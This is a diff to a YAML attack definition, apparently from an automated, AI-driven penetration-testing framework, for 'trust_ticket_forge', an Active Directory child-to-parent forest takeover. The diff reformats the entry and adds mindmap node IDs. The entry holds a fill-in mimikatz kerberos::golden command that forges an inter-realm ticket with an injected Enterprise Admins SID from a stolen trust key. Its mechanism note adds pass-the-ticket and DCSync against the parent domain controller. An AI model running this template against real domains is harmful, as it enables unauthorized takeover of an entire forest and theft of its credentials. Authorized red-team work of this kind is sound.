@@ -1,6 +1,6 @@
 name: trust_ticket_forge
 category: ad
-description: Cross-trust TGT forge with extra SIDs (child→parent forest takeover)
+description: "Cross-trust TGT forge with extra SIDs (child\u2192parent forest takeover)"
 preconditions:
 - has_trust_key
 - trust_key_extracted
@@ -12,9 +12,8 @@ parameters:
   child_sid: from_engagement.child_sid
   parent_sid: from_engagement.parent_sid
   trust_key: from_cred.trust_key
-command_template: mimikatz "kerberos::golden /user:Administrator /domain:{child_domain}
-  /sid:{child_sid} /sids:{parent_sid}-519 /rc4:{trust_key} /service:krbtgt /target:{parent_domain}
-  /ticket:trust.kirbi"
+command_template: mimikatz "kerberos::golden /user:Administrator /domain:{child_domain} /sid:{child_sid} /sids:{parent_sid}-519
+  /rc4:{trust_key} /service:krbtgt /target:{parent_domain} /ticket:trust.kirbi"
 parser: generic_parser
 expected_effects:
 - forest_admin
@@ -24,18 +23,23 @@ falsifier:
   pattern: SID filtering|denied|ERROR|mimikatz|invalid
   timeout: 30
 model_tier: sonnet
-mechanism: 'Forge an inter-realm TGT with EnterpriseAdmins SID injected via extraSids.
-  Parent
-
-  forest accepts because its krbtgt isn''t checked at this stage and SID filtering
-  is
-
-  OFF by default for in-forest trusts. Pass-the-ticket and DCSync against the parent
-
-  DC. This is the canonical child→parent forest takeover.
-
-  '
+mechanism: "Forge an inter-realm TGT with EnterpriseAdmins SID injected via extraSids. Parent\nforest accepts because its\
+  \ krbtgt isn't checked at this stage and SID filtering is\nOFF by default for in-forest trusts. Pass-the-ticket and DCSync\
+  \ against the parent\nDC. This is the canonical child\u2192parent forest takeover.\n"
 references:
-  ocd_mindmap: 'Branch 14: Cross-trust ticket forge (child → parent forest)'
+  ocd_mindmap: "Branch 14: Cross-trust ticket forge (child \u2192 parent forest)"
   hacktricks: windows-hardening/active-directory-methodology/forest-and-domain-trusts.md
+  ocd_mindmap_node_ids:
+  - 033bcba47b
+  - 0fbac96ac1
+  - 2eab5a52f2
+  - 47d646d229
+  - 93327147fe
+  - 9684291d34
+  - 9a2cae2e0f
+  - a47b5457cf
+  - b1e65277aa
+  - bbf0cf961b
+  - c8b80ebbd6
+  - ccaa0064a5
 hacktricks_ref: windows-hardening/basic-cmd-for-pentesters.md
